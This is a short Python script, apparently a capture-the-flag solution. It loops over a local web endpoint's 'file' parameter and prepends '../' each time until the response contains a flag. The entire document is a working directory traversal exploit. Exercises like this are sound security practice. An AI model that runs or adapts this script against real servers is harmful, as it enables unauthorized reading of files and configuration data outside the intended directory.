import urllib.request

url = 'http://127.0.0.1:8082/humantechconfig?file='
file = 'human.conf'
appendDir = '../'

while True:
	req = urllib.request.Request(url + file)
	res = urllib.request.urlopen(req)
	data = str(res.read(), 'utf-8')
	if 'flag' in data:
		print(data)
		break
	file = appendDir + file